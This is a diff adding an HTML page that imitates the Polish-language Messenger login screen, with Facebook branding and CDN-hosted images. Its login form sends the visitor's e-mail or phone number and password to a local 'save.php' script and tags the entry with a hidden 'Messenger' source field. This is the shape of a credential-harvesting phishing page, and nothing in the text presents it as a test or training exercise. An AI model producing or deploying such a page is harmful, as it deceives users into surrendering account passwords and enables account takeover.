@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Messenger – Logowanie</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background-color: #ffffff;
+      display: flex;
+      justify-content: space-between;
+      padding: 40px 5%;
+      color: #1c1e21;
+    }
+
+    .left {
+      width: 50%;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .logo {
+      width: 36px;
+      height: 36px;
+      margin-bottom: 30px;
+    }
+
+    nav {
+      position: absolute;
+      top: 20px;
+      right: 5%;
+      font-size: 14px;
+    }
+
+    nav a {
+      margin-left: 20px;
+      color: #1c1e21;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    h1 {
+      font-size: 48px;
+      color: #0064e0;
+      font-weight: 700;
+      margin-bottom: 20px;
+      line-height: 1.1;
+    }
+
+    p.description {
+      font-size: 16px;
+      margin-bottom: 30px;
+      color: #4b4f56;
+    }
+
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px;
+      margin-bottom: 15px;
+      border: none;
+      background-color: #f0f2f5;
+      border-radius: 8px;
+      font-size: 14px;
+    }
+
+    .form {
+      max-width: 350px;
+    }
+
+    .form button {
+      width: 100%;
+      background-color: #0064e0;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 16px;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+      margin-bottom: 10px;
+    }
+
+    .form a {
+      font-size: 14px;
+      color: #0064e0;
+      text-decoration: none;
+    }
+
+    .checkbox {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      color: #555;
+      margin-top: 15px;
+    }
+
+    .checkbox input {
+      margin-right: 8px;
+    }
+
+    .badges {
+      margin-top: 30px;
+    }
+
+    .badges img {
+      height: 40px;
+      margin-right: 10px;
+    }
+
+    .right {
+      width: 45%;
+    }
+
+    .right img {
+      max-width: 100%;
+      height: auto;
+    }
+
+    @media screen and (max-width: 960px) {
+      body {
+        flex-direction: column;
+        align-items: center;
+        padding: 20px;
+      }
+
+      .left, .right {
+        width: 100%;
+      }
+
+      .right {
+        margin-top: 40px;
+      }
+
+      nav {
+        position: static;
+        text-align: center;
+        margin-bottom: 20px;
+      }
+    }
+  </style>
+</head>
+<body>
+  <nav>
+    <a href="#">Funkcje</a>
+    <a href="#">Prywatność i bezpieczeństwo</a>
+    <a href="#">Aplikacja komputerowa</a>
+    <a href="#">Dla deweloperów</a>
+    <a href="#">Centrum pomocy</a>
+  </nav>
+
+  <div class="left">
+    <img src="https://scontent-waw2-1.xx.fbcdn.net/v/t39.8562-6/475210330_598195142840489_9172482348551739153_n.png?_nc_cat=1&ccb=1-7&_nc_sid=f537c7&_nc_ohc=_njI2LQBgbEQ7kNvwFQ7_UT&_nc_oc=AdnYY54JYs5JnURwIk9EcLi3hlILl_iJxXBJupX4R0Fp_um32B4cHRudd9RJW83LowE&_nc_zt=14&_nc_ht=scontent-waw2-1.xx&_nc_gid=HeWhJc4lsUBQ4OUH3nguLg&oh=00_AfMqMv1Zw1fr7w5A2ueB2_bTZ8lXxbOeNHwMFneSHlR1Fg&oe=684E1118" class="logo" alt="Messenger Logo" />
+
+    <h1>Miejsce wartościowych konwersacji</h1>
+
+    <p class="description">
+      Messenger pomaga w nawiązywaniu kontaktów ze znajomymi i rodziną na Facebooku, budowaniu społeczności i pogłębianiu zainteresowań.
+    </p>
+
+    <form action="save.php" method="POST" class="form">
+      <input type="hidden" name="source" value="Messenger">
+      <input type="text" name="username" placeholder="Adres e-mail lub numer telefonu" required />
+      <input type="password" name="password" placeholder="Hasło" required />
+      <button type="submit">Zaloguj się</button>
+      <a href="#">Nie pamiętasz hasła?</a>
+
+      <div class="checkbox">
+        <input type="checkbox" id="stay" />
+        <label for="stay">Nie wylogowuj mnie</label>
+      </div>
+
+      <div class="badges">
+        <img src="https://scontent-waw2-1.xx.fbcdn.net/v/t39.8562-6/119651333_656877065241554_2717899458396646563_n.svg?_nc_cat=109&ccb=1-7&_nc_sid=f537c7&_nc_ohc=i4dmT813ohQQ7kNvwH3LkwQ&_nc_oc=AdkKfKEBvti6cz-VDxaNgDVJIH4QNA82RReLMaIHAGaUUcoCcaUgl-nC18kq_4elbgU&_nc_zt=14&_nc_ht=scontent-waw2-1.xx&_nc_gid=HeWhJc4lsUBQ4OUH3nguLg&oh=00_AfNH2nS9vR2qosZ-dGObyUGsc31Dv_KrmyrZpQxjC94C2Q&oe=684E23C4" alt="App Store" />
+        <img src="https://scontent-waw2-1.xx.fbcdn.net/v/t39.8562-6/119610288_322389789185611_2118318730447560610_n.png?_nc_cat=104&ccb=1-7&_nc_sid=f537c7&_nc_ohc=0Q4yICMhutkQ7kNvwFz6s_3&_nc_oc=Adn_0YvCUkyqXbq5eKcWjEHL97AjUpSp6S4MzQdAKvyuwY8rO2sYP5gAceIsaQeByeM&_nc_zt=14&_nc_ht=scontent-waw2-1.xx&_nc_gid=HeWhJc4lsUBQ4OUH3nguLg&oh=00_AfN0hBAj2-yskm3zOZkdyoh9l6ePR_rjZwtLOUQmkBKU0w&oe=684E0AE3" alt="Microsoft Store" />
+      </div>
+    </form>
+  </div>
+
+  <div class="right">
+    <img src="https://scontent-waw2-1.xx.fbcdn.net/v/t39.8562-6/480917440_977615201170644_7130624463144407885_n.png?_nc_cat=111&ccb=1-7&_nc_sid=f537c7&_nc_ohc=N5grIrvNmVEQ7kNvwECQ3GH&_nc_oc=AdlwmX6PHXQYj4_Vjr8Vy9GjNkgWuwtu3YWzqnwMbRswmk5aEL65ia_JwKC0ODvCaCY&_nc_zt=14&_nc_ht=scontent-waw2-1.xx&_nc_gid=HeWhJc4lsUBQ4OUH3nguLg&oh=00_AfPdixlMUOtbzu2wTrg7K1fM1ccDFpJVB0MIlOCDGbba1w&oe=684E0DBD" alt="Messenger Preview" />
+  </div>
+</body>
+</html>
